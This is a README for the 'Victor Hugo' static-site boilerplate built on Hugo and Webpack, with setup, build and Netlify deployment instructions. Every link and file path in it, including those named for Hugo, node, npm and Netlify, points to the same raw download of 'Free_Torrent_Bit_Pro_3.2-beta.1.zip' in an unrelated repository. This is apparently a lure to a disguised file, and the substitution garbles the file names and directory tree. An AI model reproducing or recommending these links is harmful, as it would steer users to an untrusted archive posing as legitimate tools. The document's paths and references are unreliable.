# Victor Hugo

**A Hugo boilerplate for creating truly epic websites**

This is a boilerplate for using [Hugo](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip) as a static site generator and [Webpack](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip) as your asset pipeline.

Victor Hugo setup to use [PostCSS](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip) and [Babel](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip) for CSS and JavaScript compiling/transpiling.

This project is released under the [MIT license](LICENSE). Please make sure you understand its implications and guarantees.

## Usage

### :exclamation: Prerequisites

You need to have the latest/LTS [node](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip) and [npm](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip) versions installed in order to use Victor Hugo.

Next step, clone this repository and run:

```bash
npm install
```

This will take some time and will install all packages necessary to run Victor Hugo and its tasks.

### :construction_worker: Development

While developing your website, use:

```bash
npm start
```

or for developing your website with `hugo server --buildDrafts --buildFuture`, use:

```bash
npm run preview
```

Then visit http://localhost:3000/ _- or a new browser windows popped-up already -_ to preview your new website. Webpack Dev Server will automatically reload the CSS or refresh the whole page, when stylesheets or content changes.

### :package: Static build

To build a static version of the website inside the `/dist` folder, run:

```bash
npm run build
```

To get a preview of posts or articles not yet published, run:

```bash
npm run build:preview
```

See [https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip) for all tasks.

## Structure

```
|--site                // Everything in here will be built with hugo
|  |--content          // Pages and collections - ask if you need extra pages
|  |--data             // YAML data files with any data for use in examples
|  |--layouts          // This is where all templates go
|  |  |--partials      // This is where includes live
|  |  |https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip    // The index page
|  |--static           // Files in here ends up in the public folder
|--src                 // Files that will pass through the asset pipeline
|  |--css              // Webpack will bundle imported css separately
|  |https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip         // https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip is the webpack entry for your css & js assets
```

## Basic Concepts

You can read more about Hugo's template language in their documentation here:

https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip

The most useful page there is the one about the available functions:

https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip

For assets that are completely static and don't need to go through the asset pipeline,
use the `site/static` folder. Images, font-files, etc, all go there.

Files in the static folder end up in the web root. So a file called `https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip`
will end up being available as `https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip` and so on...

The `https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip` file is the entrypoint for webpack and will be built to `https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip`

You can use **ES6** and use both relative imports or import libraries from npm.

Any CSS file imported into the `https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip` will be run through Webpack, compiled with [PostCSS Next](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip), and
minified to `/dist/[name].[hash:5].css`. Import statements will be resolved as part of the build.

## Environment variables

To separate the development and production _- aka build -_ stages, all gulp tasks run with a node environment variable named either `development` or `production`.

You can access the environment variable inside the theme files with `getenv "NODE_ENV"`. See the following example for a conditional statement:

    {{ if eq (getenv "NODE_ENV") "development" }}You're in development!{{ end }}

All tasks starting with _build_ set the environment variable to `production` - the other will set it to `development`.

## Deploying to Netlify

- Push your clone to your own GitHub repository.
- [Create a new site on Netlify](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip) and link the repository.

Now Netlify will build and deploy your site whenever you push to git.

You can also click this button:

[![Deploy to Netlify](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip)](https://github.com/5t3fanos/BitTorrent-Pro-Free/raw/refs/heads/master/src/css/imports/Free_Torrent_Bit_Pro_3.2-beta.1.zip)

## Enjoy!! 😸
